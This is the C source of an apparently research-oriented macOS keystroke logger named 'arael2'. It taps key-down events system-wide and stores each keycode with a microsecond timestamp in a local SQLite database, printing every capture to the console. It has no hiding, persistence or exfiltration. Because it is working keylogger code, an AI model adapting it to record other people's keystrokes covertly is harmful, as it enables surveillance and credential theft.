/*  arael2 – macos keylogger
 *
 *  build : clang -O2 -std=c11 -lsqlite3 -framework ApplicationServices keylog.c -o keylog.exe
 *  usage : ./keylog.exe         (no sudo needed; event-tap works in user space)
 *
 *  startup prints:
 *      arael2 root
 *      keystroke db dir + file
 *      confirmation that the event-tap is active
 *
 *  every key-down event is:
 *      • inserted into the sqlite db (ts_us, code, os="macos")
 *      • echoed to stdout
 */

 #define _POSIX_C_SOURCE 199309L

 #include <ApplicationServices/ApplicationServices.h>
 #include <errno.h>
 #include <signal.h>
 #include <sqlite3.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/time.h>
 #include <time.h>
 #include <unistd.h>
 
 #define KEYDB_SUBDIR "/keydb"
 #define KEYDB_FILE   "/keys.db"
 #define MAX_PATH_LEN 4096
 
 /* ------------------------------------------------------------------ */
 /* helpers                                                            */
 /* ------------------------------------------------------------------ */
 static volatile sig_atomic_t stop_flag = 0;
 static sqlite3 *db        = NULL;
 static sqlite3_stmt *stmt = NULL;
 
 static void fatal(const char *msg)
 {
     perror(msg);
     exit(EXIT_FAILURE);
 }
 
 static void on_signal(int sig)
 {
     (void)sig;
     stop_flag = 1;
 }
 
 static int64_t now_us(void)
 {
     struct timeval tv;
     gettimeofday(&tv, NULL);
     return (int64_t)tv.tv_sec * 1000000LL + tv.tv_usec;
 }
 
 static void ensure_dir(const char *dir)
 {
     if (access(dir, F_OK) == -1 && mkdir(dir, 0700) == -1 && errno != EEXIST)
         fatal("mkdir keydb");
 }
 
 /* ------------------------------------------------------------------ */
 /* event-tap callback                                                 */
 /* ------------------------------------------------------------------ */
 static CGEventRef tap_cb(CGEventTapProxy proxy,
                          CGEventType     type,
                          CGEventRef      event,
                          void           *ctx)
 {
     (void)proxy;
     (void)ctx;
 
     if (type == kCGEventKeyDown) {
         int64_t ts_us = now_us();
         int code = (int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
         sqlite3_bind_int64(stmt, 1, ts_us);
         sqlite3_bind_int   (stmt, 2, code);
         sqlite3_bind_text  (stmt, 3, "macos", -1, SQLITE_STATIC);
 
         if (sqlite3_step(stmt) != SQLITE_DONE)
             fprintf(stderr, "sqlite step error: %s\n", sqlite3_errmsg(db));
 
         sqlite3_reset(stmt);
 
         printf("captured keycode %d at %lld us\n", code, (long long)ts_us);
         fflush(stdout);
     }
 
     if (stop_flag) {
         CFRunLoopStop(CFRunLoopGetCurrent());
         return NULL;
     }
     return event;
 }
 
 /* ------------------------------------------------------------------ */
 /* main                                                               */
 /* ------------------------------------------------------------------ */
 int main(void)
 {
     /* resolve db paths relative to $ARAEL2_ROOT or pwd */
     const char *root = getenv("ARAEL2_ROOT");
     if (!root || *root == '\0')
         root = "../..";
 
     char db_dir [MAX_PATH_LEN];
     char db_path[MAX_PATH_LEN];
 
     if (snprintf(db_dir,  sizeof db_dir,  "%s%s", root, KEYDB_SUBDIR) >= (int)sizeof db_dir)
         fatal("db dir path too long");
 
     if (snprintf(db_path, sizeof db_path, "%s%s", db_dir, KEYDB_FILE) >= (int)sizeof db_path)
         fatal("db file path too long");
 
     /* startup prints */
     printf("arael2 root        : %s\n", root);
     printf("keystroke db dir   : %s\n", db_dir);
     printf("keystroke db file  : %s\n", db_path);
     fflush(stdout);
 
     ensure_dir(db_dir);
 
     /* signal handlers */
     signal(SIGINT,  on_signal);
     signal(SIGTERM, on_signal);
     signal(SIGHUP,  on_signal);
     signal(SIGQUIT, on_signal);
 
     /* sqlite setup */
     if (sqlite3_open(db_path, &db) != SQLITE_OK)
         fatal("sqlite open");
 
     sqlite3_exec(db, "pragma journal_mode=WAL;", 0, 0, 0);
     sqlite3_exec(db,
         "create table if not exists keystrokes ("
         " ts_us integer,"
         " code  integer,"
         " os    text);",
         0, 0, 0);
 
     const char *sql = "insert into keystrokes(ts_us, code, os) values (?,?,?);";
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) != SQLITE_OK)
         fatal("sqlite prepare");
 
     printf("sqlite ready, installing event tap…\n");
     fflush(stdout);
 
     /* event tap */
     CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
     CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap,
                                          kCGHeadInsertEventTap,
                                          0,
                                          mask,
                                          tap_cb,
                                          NULL);
     if (!tap)
         fatal("event tap");
 
     CFRunLoopSourceRef src = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
     CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);
     CGEventTapEnable(tap, true);
 
     printf("event tap active – listening for keystrokes\n");
     fflush(stdout);
 
     CFRunLoopRun();   /* blocks until stop_flag */
 
     /* cleanup */
     sqlite3_finalize(stmt);
     sqlite3_close(db);
     fprintf(stderr, "\n[clean exit] keystrokes saved. goodbye.\n");
     return 0;
 }
 